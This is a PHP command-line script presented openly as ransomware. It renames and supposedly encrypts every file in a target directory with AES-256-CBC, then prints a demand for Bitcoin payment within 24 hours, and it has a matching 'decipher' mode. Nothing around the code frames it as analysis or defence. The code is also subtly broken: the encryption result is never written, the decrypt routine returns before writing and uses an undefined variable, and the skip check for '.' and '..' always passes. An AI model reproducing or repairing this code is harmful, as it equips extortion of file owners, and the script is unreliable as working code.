<?php
$encrypt_method = "AES-256-CBC";

function cipher($file, $destination, $encrypt_method, $key, $iv){
	$handle = fopen($file, 'rb');
	$contents = fread($handle, filesize($file));
	fclose($handle);
	$fo = fopen($destination, 'wb');
	$output = base64_encode(openssl_encrypt($contents, $encrypt_method, $key, 0, $iv));
    fwrite($fo, $contents);
}

function decipher($file, $destination, $encrypt_method, $key, $iv) {
	$handle = fopen($file, 'rb');
	$contents = fread($handle, filesize($file));
	fclose($handle);
	$fo = fopen($destination, 'wb');
	$output = openssl_decrypt(base64_decode($contents), $encrypt_method, $key, 0, $iv);
	return $output;
	fwrite($fo, $output);
}

if(isset($argv[1], $argv[2], $argv[3]) && $argv[1] === 'cipher') {
	$directory = $argv[2];
	$key_iv = explode('.', $argv[3]);
	if ($handle = opendir($directory)) { 
    	while (false !== ($fileName = readdir($handle))) {
    		if($fileName != '..' || $fileName != '.') {
    			$newName = $fileName . '.ciphered'; /** You could add extensions **/
        		@rename($directory . $fileName, $directory . $newName);
        		echo @cipher($directory . $newName, $directory . $newName, $encrypt_method, substr(md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 8), substr(md5("\x18\x3C\x58" . $key_iv[1], true) . md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 16));
    		}

    	}
    closedir($handle);
	}
	echo 'Your files has been ciphered, you must pay 16549849854654654$ in BTC within the next 24 hours.';

} elseif(isset($argv[1], $argv[2], $argv[3]) && $argv[1] === 'decipher') {
	$directory = $argv[2];
	$key_iv = explode('.', $argv[3]);
	if ($handle = opendir($directory)) { 
    	while (false !== ($fileName = readdir($handle))) {    
    		$pos = strpos($fileName, '.ciphered');
    		if ($pos !== false) {
    			@decipher($directory . $newName, $directory . $newName, $encrypt_method, substr(md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 8), substr(md5("\x18\x3C\x58" . $key_iv[1], true) . md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 16));
        		$newName = str_replace('.ciphered', "", $fileName); /** You could add extensions **/
        		@rename($directory . $fileName, $directory . $newName);
        		
        	}
        }
    closedir($handle);
	}
	echo 'Your files has been deciphered.';
} else {
	echo 'Unknown method or argv missing';
}
?>
